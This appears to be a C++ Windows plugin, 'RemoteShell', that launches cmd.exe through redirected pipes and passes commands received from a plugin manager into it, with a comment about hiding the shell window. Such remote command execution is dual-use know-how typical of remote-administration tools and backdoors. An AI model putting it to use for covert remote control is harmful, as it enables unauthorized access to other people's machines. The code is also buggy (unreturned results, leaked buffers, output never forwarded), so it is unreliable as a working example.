#include "remoteshell.h"
#include <stdio.h>

int RemoteShell::threadReader(register RemoteShell *_this){
    ulong exitCode;
    if(_this){
        char* buffer = 0;
        ulong dataSize = 0;
        _this->threadRuning = true;
        while(_this->threadRuning){
            if(_this->read(&buffer,&dataSize)){

            }else _this->threadRuning = false;
            GetExitCodeProcess(_this->ProcessInformation.hProcess,&exitCode);
            if(exitCode != STILL_ACTIVE) _this->threadRuning = false;
        }
        TerminateProcess(_this->ProcessInformation.hProcess,0);
    }
    return 0;
}

RemoteShell::RemoteShell(){
    SECURITY_ATTRIBUTES secAttr;
    mgr = null;
    hThreadReader = INVALID_HANDLE_VALUE;


    //Inicializamos a Zero
    ZeroMemory(&ProcessInformation,sizeof(ProcessInformation));
    ZeroMemory(&StartupInfo,sizeof(StartupInfo));
    ZeroMemory(&secAttr,sizeof(secAttr));

    secAttr.bInheritHandle = true;
    secAttr.nLength = sizeof(secAttr);

    //cojemos la configuracion actual de y le añadimos para que oculte la ventana y los handles
    GetStartupInfo(&StartupInfo);
    StartupInfo.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    //StartupInfo.wShowWindow = SW_HIDE;

    if(!CreatePipe(&hReadPipe,&StartupInfo.hStdOutput,&secAttr,0)
            | !CreatePipe(&StartupInfo.hStdInput,&hWritePipe,&secAttr,0)){
        printf("CreatePipe error %x\n",(uint)GetLastError());
    }
    StartupInfo.hStdError = StartupInfo.hStdOutput;
}

RemoteShell::~RemoteShell(){
    close();
    CloseHandle(hReadPipe);
    CloseHandle(StartupInfo.hStdOutput);
    CloseHandle(StartupInfo.hStdInput);
    CloseHandle(hWritePipe);
}

bool RemoteShell::open(){
    bool Result = false;
    if(CreateProcess("cmd",0,0,0,true,0,0,0,&StartupInfo,&ProcessInformation)){
        WaitForInputIdle(ProcessInformation.hProcess,INFINITE);
        hThreadReader = CreateThread(0,0,(LPTHREAD_START_ROUTINE)&threadReader,this,0,0);
    }else{
        printf("CreateProcess error %x\n",(uint)GetLastError());
    }

    return Result;
}

bool RemoteShell::close(){
    threadRuning = false;
    WaitForSingleObject(hThreadReader,1000);
    TerminateThread(hThreadReader,0);
}

bool RemoteShell::read(char **buffer, ulong *dataSize){
    bool result = false;
    PeekNamedPipe(hReadPipe,0,0,0,dataSize,0);

    if(*dataSize){
        *buffer = (char*)malloc(*dataSize);

        result = ReadFile(hReadPipe,*buffer,*dataSize,dataSize,0);
    }
    return result;
}

bool RemoteShell::write(char *buffer, ulong size){
    if(!threadRuning)open();
    return WriteFile(hWritePipe,buffer,size,&size,0);
}

const char *RemoteShell::getPluginName(){
    return "RemoteShell";
}

int RemoteShell::onReciveData(char *data, uint size){
    write(data,size);
}

void RemoteShell::setPluginManager(pluginManagerInterface *mgr){
    this->mgr = mgr;
}

PluginInterface* getInterface(){
    return new RemoteShell();
}
